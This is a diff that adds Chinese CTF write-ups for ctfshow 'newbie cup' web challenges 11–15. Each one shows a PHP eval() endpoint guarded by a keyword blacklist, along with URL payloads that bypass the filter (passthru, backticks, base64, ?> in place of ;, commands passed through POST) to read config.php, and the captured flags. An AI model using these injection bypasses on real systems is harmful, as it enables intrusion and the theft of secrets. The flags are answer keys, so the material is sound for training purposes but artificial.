@@ -5912,7 +5912,7 @@ if(isset($_GET['flag'])){
 
 ### 萌新杯web9
 
-PHP代码审计题，靶机给出的页面如下：
+PHP代码审计题，靶机给出的源码如下：
 
 ```php
 <?php
@@ -5983,7 +5983,7 @@ $flag = "ctfshow{81eca3d8-55ab-4ca4-b6ef-8bc964345dc6}";
 
 ### 萌新杯web10
 
-PHP代码审计题，靶机给出的页面如下：
+PHP代码审计题，靶机给出的源码如下：
 
 ```php
 <?php
@@ -6029,6 +6029,298 @@ $flag = "ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}";
 ```
 
 提交`ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}`即可。
+
+------
+
+### 萌新杯web11
+
+> 阿呆听完自己菜死了，自己呆了。决定修好漏洞，绝对不能让自己再菜死了。
+
+靶机给出的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|exec|highlight|cat/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+这道题进行了加固，把`cat`关键字也给过滤掉了。
+
+然而，我们还是能用`passthru()`来执行命令查看`config.php`。比如`head`，`tail`，`less`，`more`等。
+
+```
+/?c=passthru(%27head%20config.php%27);
+/?c=passthru(%27tail%20config.php%27);
+/?c=passthru(%27less%20config.php%27);
+/?c=passthru(%27more%20config.php%27);
+/?c=passthru(%27strings%20config.php%27);
+```
+
+靶机显示空白页面的话，右键检查或者查看`config.php`网页源代码，可以看到`flag`变量。
+
+```php
+<?php
+$flag = "ctfshow{aa626712-942d-47b2-a97a-5488f59dec43}";
+?>
+```
+
+用`nl`和`tac`也可以查看`config.php`源码，显示略微不同。
+
+```
+/?c=passthru(%27nl%20config.php%27);
+/?c=passthru(%27tac%20config.php%27);
+```
+
+提交`ctfshow{aa626712-942d-47b2-a97a-5488f59dec43}`即可。
+
+------
+
+### 萌新杯web12
+
+> 阿呆不慌不忙的拔掉自己所有的菜，以后自己就不会菜死了。
+
+靶机给出的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|exec|highlight|cat|\.|php|config/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+哦嚯，这一次加固把`.`也给过滤掉了。
+
+我们依然可以使用`passthru()`来执行命令，过滤了点，那就`nl *`将当前路径的所有文件全部输出。
+
+```
+/?c=passthru(%27nl%20*%27);
+```
+
+靶机显示1 4 18，右键查看网页源代码如下：
+
+```php+HTML
+ 1	<?php
+ 2	$flag = "ctfshow{9e3a8f26-1fdb-47b0-8c2d-dca6ca08d940}";
+ 3	?>
+ 4	<?php
+ 5	# flag in config.php
+ 6	include("config.php");
+ 7	if(isset($_GET['c'])){
+ 8	        $c = $_GET['c'];
+ 9	        if(!preg_match("/system|exec|highlight|cat|\.|php|config/i",$c)){
+10	                eval($c);
+11	        }else{
+12	            die("cmd error");
+13	        }
+14	}else{
+15	        highlight_file(__FILE__);
+16	}
+17	?>
+18
+```
+
+这是最快最便捷的方法。`tac *`也能查看`config.php`，但是其输出内容不如`nl`美观。
+
+```
+/?c=passthru(%27tac%20*%27);
+```
+
+靶机显示的内容如下：
+
+```
+?> $flag = "ctfshow{9e3a8f26-1fdb-47b0-8c2d-dca6ca08d940}"; } highlight_file(__FILE__); }else{ } die("cmd error"); }else{ eval($c); if(!preg_match("/system|exec|highlight|cat|\.|php|config/i",$c)){ $c = $_GET['c']; if(isset($_GET['c'])){ include("config.php"); # flag in config.php
+```
+
+方法二：还可以用`base64`编码绕过，这需要用到临时变量。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_encode('config.php'));"
+string(16) "Y29uZmlnLnBocA=="
+```
+
+需要执行两条命令，先`$a=base64_decode('Y29uZmlnLnBocA==');`，再`passthru("more $a");`。
+
+```
+/?c=$a=base64_decode(%27Y29uZmlnLnBocA==%27);passthru("more%20$a");
+```
+
+方法三：通过反引号绕过，反引号中的命令会先被执行并将执行结果以字符串类型的变量返回，然后再参与到该命令行的其他代码中执行。比如以下命令的返回值是`config.php`。
+
+```
+?c=echo `ls | grep con*`;
+```
+
+因此，我们可以通过`head`，`tail`，`less`，`more`、`strings`等方式将其内容输出。
+
+```
+/?c=passthru(%27more%20`ls%20|%20grep%20con*`%27);
+```
+
+靶机显示空白页面，右键检查网页源代码。
+
+```php
+<!--?php
+$flag = "ctfshow{9e3a8f26-1fdb-47b0-8c2d-dca6ca08d940}";
+?-->
+```
+
+提交`ctfshow{9e3a8f26-1fdb-47b0-8c2d-dca6ca08d940}`即可。
+
+------
+
+### 萌新杯web13
+
+> 阿呆彻底呆了，阿呆拿起谷姐搜索好久，终于找到更狠的方法。
+
+靶机的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|exec|highlight|cat|\.|\;|file|php|config/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+这一次`;`也被过滤掉了，但是必要时我们可以用`?>`代替分号。将上一题的反引号绕过法的分号改为`?>`。
+
+```
+/?c=passthru(%27more%20`ls%20|%20grep%20con*`%27)?>
+```
+
+右键检查靶机源代码：
+
+```php
+<!--?php
+$flag = "ctfshow{ff443b29-da87-4844-ac52-2de83ed11cb0}";
+?-->
+```
+
+上一题的这两个`payload`修改分号为`?>`后也依旧可以拿到`flag`。
+
+```
+/?c=passthru(%27nl%20*%27)?>
+/?c=passthru(%27tac%20*%27)?>
+```
+
+提交`ctfshow{ff443b29-da87-4844-ac52-2de83ed11cb0}`即可。
+
+------
+
+### 萌新杯web14
+
+> 阿呆忍无可忍了，告诉自己，如果还被攻，自己就跳下去。
+
+靶机的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|exec|highlight|cat|\(|\.|\;|file|php|config/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+哦嚯，这一次左括号`(`也被过滤掉了，右括号还是可以用的，但是半边括号没啥意义。
+
+```
+/?c=echo%20%27)%27?>
+```
+
+`passthru()`不能失去括号，就像西方不能失去耶路撒冷。我们只能使用不需要括号的`echo`语句输出反引号中的`nl *`或`tac *`啦。
+
+```
+/?c=echo%20`tac%20*`?>
+/?c=echo%20`nl%20*`?>
+```
+
+执行`tac *`后，靶机的显示内容如下：
+
+```
+?> $flag = "ctfshow{40693b9c-f1e6-47f3-a679-bdebfceae838}"; } highlight_file(__FILE__); }else{ } die("cmd error"); }else{ eval($c); if(!preg_match("/system|exec|highlight|cat|\(|\.|\;|file|php|config/i",$c)){ $c = $_GET['c']; if(isset($_GET['c'])){ include("config.php"); # flag in config.php
+```
+
+提交`ctfshow{40693b9c-f1e6-47f3-a679-bdebfceae838}`即可。
+
+------
+
+### 萌新杯web15
+
+> 人为什么要活着？难道埃塞俄比亚再无我阿呆容身之处？
+
+靶机的源码如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|\\*|\?|\<|\>|\=|exec|highlight|cat|\(|\.|file|php|config/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+在这里来写个详细点的PHP代码审计吧。这次加固把`*`也给过滤了。过滤规则把很多常用的关键字给过滤了（如`system`，`*`，`?`，`<`，`>`，`=`，`exec`，`highlight`，`cat`，`(`，`.`，`file`，`php`，`config`等），但是没有过滤空格、数字、大部分字母等，并且这些过滤都是针对`GET`请求传递的参数`c`。
+
+我们依旧可以使用`echo`和反引号来执行系统命令。POST请求并没有任何限制，只要能构造`POST`请求，就可以执行大量的系统命令。用`HackBar`构造`POST`请求，访问靶机的路径如下：
+
+```
+/?c=echo%20`$_POST[a]`;
+```
+
+发送`POST`数据`a=tac config.php`，可以在靶机看到以下内容：
+
+```
+?> $flag = "ctfshow{9185a6b4-532b-4a1f-88c6-114afa08d45f}";
+```
+
+提交`ctfshow{9185a6b4-532b-4a1f-88c6-114afa08d45f}`即可。
 
 ------
 
